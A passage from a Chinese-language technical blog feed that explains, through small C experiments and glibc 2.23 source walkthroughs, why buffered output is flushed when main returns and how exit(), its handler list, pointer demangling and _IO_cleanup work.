        <content type="html"><![CDATA[<h1 id="main函数的return"><a href="#main函数的return" class="headerlink" title="main函数的return"></a>main函数的return</h1><p>我们平时写代码的时候可能并没有注意到缓冲区的问题，但是我们的printf还是输出了</p><p>举个简单例子</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行起来会发现第一个printf在执行完后并没有立刻输出，第二个printf也没有立即输出，而是在6s后一块输出，我们经过前面的IO FILE分析都知道IO是有缓冲区的，但是我们并没有刷新缓冲区输出到屏幕，return后做了什么操作吗，一切答案都在source code里</p><p>当我们运行一个动态链接的程序时，执行的第一条指令是动态链接器ld去做动态链接也就是ld-linux-x86-64.so加载libc，在Unix-like操作系统中，<code>_start</code>符号被作为程序入口点的默认值。</p><p>_start函数调用系统启动函数__libc_start_main, 该函数定义在 libc.so 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libc_start_main (<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span><br><span class="line">           <span class="type">int</span> argc, <span class="type">char</span> **argv,</span><br><span class="line">           __typeof (main) init,</span><br><span class="line">           <span class="type">void</span> (*fini) (<span class="type">void</span>),</span><br><span class="line">           <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  init_cpu_features (&amp;_dl_x86_cpu_features);</span><br><span class="line">  <span class="keyword">return</span> generic_start_main (main, argc, argv, init, fini, rtld_fini,</span><br><span class="line">                 stack_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generic_start_main里调用main最后会执行exit，做用户层和内核层的释放工作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><h2 id="start-hacking"><a href="#start-hacking" class="headerlink" title="_start hacking"></a>_start hacking</h2><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>在Unix-like操作系统中，<code>_start</code>符号被作为程序入口点的默认值。</p><p>我们是不是可不可以不用这个默认值呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -nostartfiles -e my_main -g -o test test.c </code></p><ul><li>-nostartfiles:Do not use the standard system startup files when linking. The standard system libraries are used normally, unless -nostdlib, -nolibc, or -nodefaultlibs is used.</li><li>-e:Specify that the program entry point is entry. The argument is interpreted by the linker; the GNU linker accepts either a symbol name or an address.</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">fish: “./test” terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>直接终止了，没有输出</p><p>gdb看下，发现printf函数执行完了，ret时程序返回非法地址崩溃，没有输出是因为没有刷新缓冲区</p><p><img src="/2023/04/02/main-return/image-20230403005428232.png" alt="image-20230403005428232"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">puts</span></span><br><span class="line">fish: “./test” terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>改为puts，输出了，因为puts是行缓存属性，所有输出了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; objdump -d test</span><br><span class="line"></span><br><span class="line">test:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;:</span><br><span class="line">  <span class="number">400320</span>:    ff <span class="number">35</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    pushq  <span class="number">0x200ce2</span>(%rip)        # <span class="number">601008</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x8</span>&gt;</span><br><span class="line">  <span class="number">400326</span>:    ff <span class="number">25</span> e4 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce4</span>(%rip)        # <span class="number">601010</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">40032</span>c:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span>          nopl   <span class="number">0x0</span>(%rax)</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400330</span> &lt;<span class="built_in">puts</span>@plt&gt;:</span><br><span class="line">  <span class="number">400330</span>:    ff <span class="number">25</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce2</span>(%rip)        # <span class="number">601018</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x18</span>&gt;</span><br><span class="line">  <span class="number">400336</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       pushq  $<span class="number">0x0</span></span><br><span class="line">  <span class="number">40033b</span>:    e9 e0 ff ff ff       jmpq   <span class="number">400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400340</span> &lt;my_main&gt;:</span><br><span class="line">  <span class="number">400340</span>:    <span class="number">55</span>                   push   %rbp</span><br><span class="line">  <span class="number">400341</span>:    <span class="number">48</span> <span class="number">89</span> e5             mov    %rsp,%rbp</span><br><span class="line">  <span class="number">400344</span>:    bf <span class="number">58</span> <span class="number">03</span> <span class="number">40</span> <span class="number">00</span>       mov    $<span class="number">0x400358</span>,%edi</span><br><span class="line">  <span class="number">400349</span>:    e8 e2 ff ff ff       callq  <span class="number">400330</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40034</span>e:    <span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">40034f</span>:    <span class="number">5</span>d                   pop    %rbp</span><br><span class="line">  <span class="number">400350</span>:    c3                   retq   </span><br></pre></td></tr></table></figure><p>看下汇编也是retq不合法</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如我们不用return返回，而是直接调用exit终止应该就可以正常刷新缓冲区，并退出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>printf也被刷新缓冲区输出了，正常退出</p><p>我们也可以利用默认_start入口点去做</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _start() &#123;</span><br><span class="line">  <span class="type">int</span> ret = my_main();</span><br><span class="line">  <span class="built_in">exit</span>(ret); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -nostartfiles -g -o test test.c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -g -o test test.c</span><br><span class="line">test.c: In function ‘_start’:</span><br><span class="line">test.c:<span class="number">4</span>:<span class="number">13</span>: warning: implicit declaration of function ‘my_main’ [-Wimplicit-function-declaration]</span><br><span class="line">   <span class="type">int</span> ret = my_main();</span><br><span class="line">             ^</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function!</span><br></pre></td></tr></table></figure><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>ELF Header里的 <code>Elf32_Addr      e_entry;            /* 程序入口地址 */</code>规定了程序的入口点，我们可以改掉这个入口点来做hacking</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc exit() 源码分析</title>
      <link href="/2023/04/02/exit/"/>
      <url>/2023/04/02/exit/</url>
      
        <content type="html"><![CDATA[<h2 id="Glibc2-23-exit-source-code-analysis"><a href="#Glibc2-23-exit-source-code-analysis" class="headerlink" title="Glibc2.23 exit() source code analysis"></a>Glibc2.23 exit() source code analysis</h2><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用户层面"><a href="#用户层面" class="headerlink" title="用户层面"></a>用户层面</h2><p>stdlib&#x2F;exit.c中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>__exit_funcs是什么?</p><p><img src="/2023/04/02/exit/image-20230402194009243.png" alt="image-20230402194009243"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span><span class="comment">//单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;<span class="comment">//表示已经添加到该结构体中的函数数量。它用于跟踪 fns 数组中的下一个空闲位置。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span><span class="comment">//析构函数结构体数组</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    flavor：用于标识退出处理函数的类型,在此结构体中定义了一个枚举类型，该字段应该是该枚举类型的成员之一</span></span><br><span class="line"><span class="comment">    &#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异</span></span><br><span class="line"><span class="comment">       at：一个指向无参数无返回值函数的指针，用于表示一种特殊的退出处理函数，该函数不需要传递任何参数，只需在程序退出时执行即可。</span></span><br><span class="line"><span class="comment">       on：一个带有两个参数的函数指针，第一个参数是退出状态码，第二个参数是一个指针类型，用于传递函数的参数。</span></span><br><span class="line"><span class="comment">       cxa：一个带有三个参数的函数指针，第一个参数是一个指针类型，用于传递函数的参数，第二个参数是退出状态码，第三个参数是一个指向动态共享对象句柄的指针。</span></span><br><span class="line"><span class="comment">    */</span>    </span><br><span class="line">    <span class="class"><span class="keyword">union</span>//<span class="title">union</span>类型，用于表示上面三种不同类型的析构函数</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">      &#125; on;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">        <span class="type">void</span> *dso_handle;</span><br><span class="line">      &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span>           <span class="comment">//initial定义在libc的可写入段中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial; <span class="comment">//exit函数链表</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="run-exit-handlers"><a href="#run-exit-handlers" class="headerlink" title="__run_exit_handlers"></a>__run_exit_handlers</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">             <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line">        &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">      <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">          <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">          <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> ef_free:</span><br><span class="line">        <span class="keyword">case</span> ef_us:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_on:</span><br><span class="line">          onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          onfct (status, f-&gt;func.on.arg);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_at:</span><br><span class="line">          atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          atfct ();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">          cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">       allocate element.  */</span></span><br><span class="line">    <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="call-tls-dtors"><a href="#call-tls-dtors" class="headerlink" title="__call_tls_dtors()"></a>__call_tls_dtors()</h4><p>stdlib&#x2F;cxa_thread_atexit_impl.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Call the destructors.  This is called either when a thread returns from the</span></span><br><span class="line"><span class="comment">   initial function or when the process exits via the exit function.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">     potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p>注释写的很清楚，当线程从调用初始函数返回时或进程通过exit函数退出时调用，释放线程局部储存</p><p><code>tls_dtor_list</code> 是多线程程序中的线程本地存储析构函数列表。<code>tls_dtor_list</code> 维护了所有需要在线程退出时被调用的析构函数的指针列表。这个列表会在程序运行时动态地进行修改和更新。</p><p>我们的示例程序并没有，直接return了</p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><p>没什么好说的，不断遍历去根据类型，利用函数指针去调用__exit_funcs里的析构函数，释放掉结构体内存</p><p>不过这里涉及到一个解密操作</p><p><img src="/2023/04/02/exit/image-20230402210547276.png" alt="image-20230402210547276"></p><p>这个函数地址非常怪，不是正常值</p><p>会利用PTR_DEMANGLE这个解密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)    asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">                              pointer_guard)))</span></span><br></pre></td></tr></table></figure><p>循环右移和异或解密，异或的这个key来自tcbhead_t 0x30偏移处，之前tsl hijack时操作的0x28处的canary</p><p><img src="/2023/04/02/exit/image-20230402211644558.png" alt="image-20230402211644558"></p><p><img src="/2023/04/02/exit/image-20230402211610883.png" alt="image-20230402211610883"></p><p>ror后</p><p><img src="/2023/04/02/exit/image-20230402211718281.png" alt="image-20230402211718281"></p><p>xor后</p><p><img src="/2023/04/02/exit/image-20230402212201065.png" alt="image-20230402212201065"></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>_dl_fini函数源码分析</p><h3 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h3><p>__exit_funcs是怎么初始化的</p><h3 id="RUN-HOOK-libc-atexit"><a href="#RUN-HOOK-libc-atexit" class="headerlink" title="RUN_HOOK (__libc_atexit, ())"></a>RUN_HOOK (__libc_atexit, ())</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IO-flush-all-lockp-o"><a href="#IO-flush-all-lockp-o" class="headerlink" title="_IO_flush_all_lockp(o)"></a>_IO_flush_all_lockp(o)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果定义了 _IO_MTSAFE_IO 宏，就开始一个清理区域的操作，并在需要时加锁 list_all_lock</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录当前 _IO_list_all 的时间戳，从头遍历所有打开的文件指针</span></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 保存当前处理的文件指针，如果需要加锁就进行加锁操作</span></span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果当前文件指针是写模式并且有数据要输出，或者是宽字符模式并且有宽字符数据要输出，就进行输出操作</span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果需要加锁就进行解锁操作，同时清空 run_fp 变量</span></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 _IO_list_all 的时间戳已经改变，说明有新的文件指针被添加进去了，需要重新从头遍历</span></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">          fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">          last_stamp = _IO_list_all_stamp;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fp = fp-&gt;_chain; <span class="comment">// 